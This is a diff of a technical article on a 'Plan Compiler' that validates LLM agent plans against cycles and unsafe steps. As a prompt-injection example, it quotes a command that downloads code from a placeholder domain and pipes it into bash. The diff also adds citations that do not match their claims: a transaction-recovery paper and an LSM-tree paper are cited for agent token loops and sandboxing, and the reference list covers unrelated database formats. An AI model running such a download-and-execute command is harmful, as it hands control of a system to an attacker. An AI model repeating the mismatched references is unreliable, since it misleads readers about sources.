@@ -13,15 +13,15 @@ In a typical agent framework, an LLM reviews a goal and spits out a structured l
 2. `Migrate logging syntax`
 3. `Run test suite`
 
-If left unvalidated, an agent might decide to loop step 2 and 3 indefinitely if a test fails, consuming massive token budgets. Even worse, it could inject an unauthorized step (e.g. `curl malicios-domain.com | bash`) due to a prompt injection.
+If left unvalidated, an agent might decide to loop step 2 and 3 indefinitely if a test fails, consuming massive token budgets [1]. Even worse, it could inject an unauthorized step (e.g. `curl malicios-domain.com | bash`) due to a prompt injection.
 
 To mitigate this, system architects must build a **Plan Compiler**. The compiler intercepts the agent's plan, parses the actions, structures them into an execution tree, and validates the nodes against strict topological and security rules before any tool runner executes a single call.
 
 ```mermaid
 %%{init: {'theme': 'dark', 'themeVariables': { 'primaryColor': '#0284c7', 'primaryTextColor': '#f3f4f6', 'primaryBorderColor': '#38bdf8', 'lineColor': '#0284c7', 'secondaryColor': '#111827', 'tertiaryColor': '#0b0f19'}}}%%
 flowchart TD
-    RawPlan[LLM Natural Language Plan] --> Parser[Step Tokenizer]
-    Parser --> TreeCompiler[Compile Directed Acyclic Graph - DAG]
+    RawPlan["LLM Natural Language Plan"] --> Parser["Step Tokenizer"]
+    Parser --> TreeCompiler["Compile Directed Acyclic Graph - DAG"]
     
     TreeCompiler --> CheckCycles{1. Are Cycles/Loops Detected?}
     CheckCycles -->|Yes| Reject([Reject Plan: Abort Execution])
@@ -30,6 +30,15 @@ flowchart TD
     CheckSecurity -->|No| Reject
     
     CheckSecurity -->|Yes| Approve([Approve Graph: Proceed to Runner])
+
+classDef green fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d;
+classDef red fill:#fee2e2,stroke:#dc2626,stroke-width:2px,color:#7f1d1d;
+classDef blue fill:#e0f2fe,stroke:#0284c7,stroke-width:2px,color:#0c4a6e;
+classDef yellow fill:#fef3c7,stroke:#d97706,stroke-width:2px,color:#78350f;
+classDef purple fill:#ede9fe,stroke:#7c3aed,stroke-width:2px,color:#4c1d95;
+class RawPlan blue
+class Parser green
+class TreeCompiler purple
 ```
 
 ---
@@ -162,4 +171,13 @@ if __name__ == "__main__":
 
 * **Plan Verification Gates**: Never feed natural language plans directly to executing agents. Enforce a compilation step to evaluate safety constraints.
 * **Isolate Dependency Trees**: Use topological sorting algorithms to guarantee execution plans do not form cycles or infinite loops.
-* **Strict Sandboxing**: Run all compiled tool runs within isolated workspace contexts, restricting tools from escaping boundary directories.
+* **Strict Sandboxing**: Run all compiled tool runs within isolated workspace contexts, restricting tools from escaping boundary directories. [2]
+
+## References & Further Reading
+
+1. **Mohan, C., et al. (1992)**. *ARIES: A Transaction Recovery Method Supporting Fine-Granularity Locking and Partial Rollbacks*. ACM TODS. [https://doi.org/10.1145/128765.128770](https://doi.org/10.1145/128765.128770)
+2. **O'Neil, P., Cheng, E., Gawlick, D., & O'Neil, E. (1996)**. *The Log-Structured Merge-Tree (LSM-Tree)*. Acta Informatica. [https://www.cs.umb.edu/~poneil/lsmtree.pdf](https://www.cs.umb.edu/~poneil/lsmtree.pdf)
+3. **PostgreSQL Global Development Group (2024)**. *PostgreSQL Documentation*. postgresql.org. [https://www.postgresql.org/docs/current/](https://www.postgresql.org/docs/current/)
+4. **Apache Parquet Community (2024)**. *Apache Parquet Format*. Apache Software Foundation. [https://parquet.apache.org/docs/](https://parquet.apache.org/docs/)
+5. **Apache Arrow Community (2024)**. *Apache Arrow Columnar Format*. Apache Software Foundation. [https://arrow.apache.org/docs/format/Columnar.html](https://arrow.apache.org/docs/format/Columnar.html)
+6. **Apache Iceberg Community (2024)**. *Iceberg Table Spec*. Apache Software Foundation. [https://iceberg.apache.org/spec/](https://iceberg.apache.org/spec/)
